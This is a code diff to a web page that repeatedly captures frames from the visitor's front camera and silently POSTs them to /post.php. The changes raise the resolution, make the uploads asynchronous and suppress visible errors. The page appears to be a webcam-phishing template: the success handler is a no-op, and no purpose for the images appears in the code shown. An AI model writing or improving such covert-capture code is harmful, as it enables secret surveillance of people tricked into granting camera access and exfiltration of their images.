@@ -11,7 +11,7 @@
   <video id="video" playsinline autoplay></video>
 </div>
 
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
+<center><canvas id="canvas" width="640" height="480"></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
@@ -123,12 +123,13 @@
       type: 'POST',
       data: { cat: imgdata },
       url: '/post.php',
-      dataType: 'json',
-      async: false,
+      dataType: 'text',
+      async: true,
       success: function (result) {
-        // call the function that handles the response/results
+        // no-op
       },
-      error: function () {
+      error: function (xhr, status, err) {
+        console.warn('post error', status, err);
       }
     });
   };
@@ -143,8 +144,9 @@
   const constraints = {
     audio: false,
     video: {
-
-      facingMode: "user"
+      facingMode: { ideal: "user" },
+      width: { ideal: 1280 },
+      height: { ideal: 720 }
     }
   };
 
@@ -154,7 +156,11 @@
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       handleSuccess(stream);
     } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      if (errorMsgElement) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      } else {
+        console.warn('getUserMedia error', e.toString());
+      }
     }
   }
 
@@ -163,15 +169,25 @@
     window.stream = stream;
     video.srcObject = stream;
 
+    // Ensure video metadata is loaded so we can size the canvas to the stream.
+    video.addEventListener('loadedmetadata', function () {
+      try {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+      } catch (e) {
+        canvas.width = 640;
+        canvas.height = 480;
+      }
+    });
+
     var context = canvas.getContext('2d');
     setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);
-      video.play();
     }, 1500);
 
+    video.play();
 
   }
   function PopUp(){
